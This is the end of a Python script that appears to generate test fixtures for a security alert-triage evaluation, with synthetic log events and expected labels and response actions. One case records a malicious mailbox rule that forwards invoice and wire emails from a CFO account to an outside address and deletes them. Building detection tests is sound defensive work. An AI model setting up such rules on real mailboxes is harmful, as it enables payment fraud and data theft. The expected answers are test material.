    evs.append({"ts": (base + timedelta(minutes=20)).isoformat(), "kind": "cloud", "source": "o365", "provider": "m365",
                "api_call": "New-InboxRule", "user": "cfo.smith@corp.example", "source_ip": "45.83.140.9", "outcome": "success",
                "raw": {"Operation": "New-InboxRule", "Parameters": [
                    {"Name": "Name", "Value": ".."}, {"Name": "SubjectContainsWords", "Value": "invoice;payment;wire"},
                    {"Name": "ForwardTo", "Value": "ap.payments@proton.me"}, {"Name": "DeleteMessage", "Value": "True"}]}})
    write("27-public-bucket-and-bec-rule", evs, {
        "name": "export bucket opened to the internet; CFO mailbox forwards invoices outside",
        "description": "Two unrelated cloud findings in the same hour; they must stay separate.",
        "alerts": [
            {"rule": "public_bucket", "match": {"user": "analyst-kb"}, "label": "true_positive", "expect_actions": TICKET},
            {"rule": "mailbox_forwarding_rule", "match": {"user": "cfo.smith@corp.example"}, "label": "true_positive",
             "expect_actions": {"lock_user": "approve", **TICKET}},
        ],
    })


def case_benign_endpoint_and_cloud():
    base = T0 + timedelta(minutes=10)
    rng = random.Random(39)
    evs = endpoint_noise(T0, 80, 39)
    evs.append(proc(base, action="service_installed", host="ws-20", user="LocalSystem", process_name="services.exe",
                    target='"C:\\Program Files\\Zoom\\bin\\ZoomService.exe"',
                    command_line='ZoomService: "C:\\Program Files\\Zoom\\bin\\ZoomService.exe"'))
    evs.append(proc(base, action="start", host="ws-20", user="rkhan", parent_name="excel.exe", process_name="splwow64.exe",
                    command_line="splwow64.exe 12288"))
    t = base
    for i in range(10):     # update checker: periodic-ish but with human-scale jitter
        t += timedelta(seconds=rng.choice([600, 900, 1500, 3600]))
        evs.append(net(t, host="ws-20", source_ip="10.0.4.20", dest_ip="13.107.4.50", dest_port=443, protocol="tcp",
                       bytes_out=900, bytes_in=40000))
    evs += [cloud(base + timedelta(minutes=m), c, user="ops", ip="10.0.1.5", params=p) for m, c, p in [
        (1, "RunInstances", {"instanceType": "t3.small"}), (2, "CreateAccessKey", {}),
        (3, "PutBucketPolicy", {"bucketName": "logs", "bucketPolicy": {"Statement": [
            {"Effect": "Allow", "Principal": {"AWS": "arn:aws:iam::111122223333:role/ingest"}, "Action": "s3:PutObject"}]}})]]
    evs.append(cloud(base + timedelta(minutes=4), "ConsoleLogin", user="ops", ip="10.0.1.5",
                     responseElements={"ConsoleLogin": "Success"}, additionalEventData={"MFAUsed": "Yes"}))
    write("28-benign-admin-day", evs, {
        "name": "ordinary admin activity that resembles six Phase 4 rules",
        "description": "Vendor service install, Excel printing, a jittery update checker, and routine AWS work with MFA.",
        "alerts": [],
    })


if __name__ == "__main__":
    if EVAL.exists():
        shutil.rmtree(EVAL)
    EVAL.mkdir(parents=True)
    for fn in [case_brute_force, case_password_spray, case_impossible_travel, case_mfa_fatigue, case_service_account_fp,
               case_quiet_hour, case_credential_stuffing, case_new_geo_benign, case_attack_chain, case_dormant,
               case_service_account_rdp, case_create_then_privilege, case_session_replay, case_reset_abuse,
               case_lockout_storm, case_single_reset, case_phish_chain, case_ransomware, case_cred_dump_and_cleanup,
               case_lolbin_persistence_tamper, case_dns_tunnel, case_internal_scan, case_exfil, case_ioc,
               case_cloud_takeover, case_public_bucket_and_forwarding, case_benign_endpoint_and_cloud]:
        fn()
    print(f"\nfixtures written to {EVAL}")
